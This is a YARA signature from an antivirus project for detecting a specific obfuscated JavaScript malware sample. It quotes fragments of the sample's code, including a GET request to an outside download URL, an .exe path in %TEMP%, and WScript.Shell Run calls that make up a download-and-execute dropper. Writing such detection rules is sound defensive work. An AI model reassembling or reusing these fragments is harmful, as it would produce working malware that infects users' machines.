rule sig_20160328_8f6a06dc968cd65396a5e389ac5d882d {
  meta:
    description = "datamaliciousorder - file 20160328_8f6a06dc968cd65396a5e389ac5d882d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4cf064b5d58d1468baa84ee8d0a5ceab9aa930494966a529077df873e5650adc"

  strings:
    $s1  = "function Vkmgjs() {return Tnrwq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"epfCyiCjB7bxDUN.exe\";};" fullword ascii
    $s2  = "Fjckiyq[Kuhkkbplb](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Tyrljsl](Azehpyurt() * 11)} while (Fjckiyq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Edgdju(Lyrsnd, Jqjdsvqfaf){return Lyrsnd - Jqjdsvqfaf;};" fullword ascii
    $s5  = "var Tnrwq = function Vmddf() {return WScript[Owcikrm](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Nsrugodbv(Snbxy){Tnrwq[\"Run\"](Snbxy, Ahboj, Ahboj);};" fullword ascii
    $s7  = "function Qwhlemgm() {return ((Gkuxhe == true) && (Gkuxhe == Kseycyeat)) ? 1 : Ahboj;};" fullword ascii
    $s8  = "var Gkuxhe = false;" fullword ascii
    $s9  = "function Wdvyb(){return Owcikrm;};" fullword ascii
    $s10 = "function Bawdzymaf(Qekxdecgzk) {var Ynvqghzb = (1, 2, 3, 4, 5, Qekxdecgzk); return Ynvqghzb;};" fullword ascii
    $s11 = "var Crautfklx = new this[\"Date\"]();" fullword ascii
    $s12 = "var Mziubldmnc = false;" fullword ascii
    $s13 = "Gkuxhe = true; " fullword ascii
    $s14 = "var Kseycyeat = false;" fullword ascii
    $s15 = "function Kkyvikpkqs()" fullword ascii
    $s16 = "function Azehpyurt(){return 22;};" fullword ascii
    $s17 = "Kseycyeat = true; " fullword ascii
    $s18 = " while (Hxwls){" fullword ascii
    $s19 = "return Edgdju(Nousnfaz, Pqrysjro);" fullword ascii
    $s20 = "function Aguugw(){return Dtelub;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}